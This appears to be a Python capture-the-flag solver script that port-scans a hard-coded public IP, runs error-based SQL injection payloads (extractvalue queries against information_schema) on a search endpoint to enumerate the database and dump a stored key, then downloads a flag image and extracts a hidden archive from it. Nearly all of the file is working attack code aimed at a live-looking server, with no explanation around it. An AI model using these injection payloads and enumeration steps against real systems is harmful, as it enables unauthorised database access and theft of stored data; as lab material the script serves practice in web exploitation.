# Tencent Cloud: http://81.70.163.207:3366/
import requests
import base64
import socket
from bs4 import BeautifulSoup
import re
import urllib.request as request
import rarfile
import os

def get_ip_status(ip):
    sk=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    sk.settimeout(20)
    ip='81.70.163.207'
    startport=3365
    endport=3367
    ports = []

    for port in range(startport,endport):
        print('正在扫描端口：%d'%port)
        try:
            sk.connect((ip,port))
            print('Server %s port %d OK!' %(ip,port))
            ports.append(port)
        except Exception:
            print('Server %s port %d is not connected!' % (ip,port))
    sk.close()
    return ports[0]


headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36"}


# SQL injection
def sql_inject(port):
    base_url = "http://81.70.163.207:"+str(port)+"/search?keyword="
    # base_url = "http://127.0.0.1:3366/search?keyword="

    sql_db_name = "l' and extractvalue(1,concat(0x7e,database(),0x7e)) -- "
    db_name_request = requests.get(base_url + sql_db_name, headers=headers)
    db_name = db_name_request.text.split('\'')[1]
    # print(db_name)

    sql_table_names = "l' and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e)) -- "
    table_names_request = requests.get(base_url + sql_table_names, headers=headers)
    table_names = table_names_request.text.split('\'')[1]
    # print(table_names)

    flag_table = table_names.strip('~').split(',')[1]
    # print(flag_table)

    sql_col_names = "l' and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='"+'user_key_tb'+"'),0x7e)) -- "
    col_names_request = requests.get(base_url + sql_col_names, headers=headers)
    cols = col_names_request.text.split('~')[1].split(',')
    # print(cols)

    col1 = []
    # col2 = []

    for col in cols:
        sql = "l' and extractvalue(1,concat(0x7e,(select group_concat(" + col + ") from user_key_tb),0x7e)) -- "
        col_request = requests.get(base_url + sql, headers=headers)
        col_content = col_request.text
        col1.append(col_content.split('~')[1].split(','))

    key_encrypted = col1[1][0]
    # print(col1)

    key_bytes = key_encrypted.encode("utf-8")

    key = base64.b64decode(key_bytes)
    # print(key)

    return str(key).split('\'')[1]

# blob
def download_flag_image(key, port):
    print(key)
    # url = 'http://127.0.0.1:3366/search?keyword=flag'
    flag_img = key.split('{')[1].split('}')[0]
    print(flag_img)

    url = "http://81.70.163.207:"+str(port)+"/image/" + flag_img
    img = requests.get(url, headers=headers)
    open('flag.jpg', 'wb').write(img.content) # 将内容写入图片


def get_flag(jpg_name):


    portion=os.path.splitext(jpg_name)
    if portion[1]==".jpg":
        new_name=portion[0]+".rar"
        jpg_name=os.path.join(jpg_name)
        new_name=os.path.join(new_name)
        print(jpg_name)
        print(new_name)
        os.rename(jpg_name, new_name)
        path=new_name
        path2="./get_flag/"
        rf=rarfile.RarFile(path)
        rf.extractall(path2)

    with open(path2+'LSB.txt', 'r') as f:
        data=f.read()
        print(data)
        flag=base64.b64decode(data).decode("utf-8")
        print(flag)

if __name__ == '__main__':
    # 端口扫描
    # port = get_ip_status('81.70.163.207')
    port = 3366
    key = sql_inject(port)

    download_flag_image(key, port)

    jpgs_name='flag.jpg'

    # 提取图片中隐藏key
    get_flag(jpgs_name)




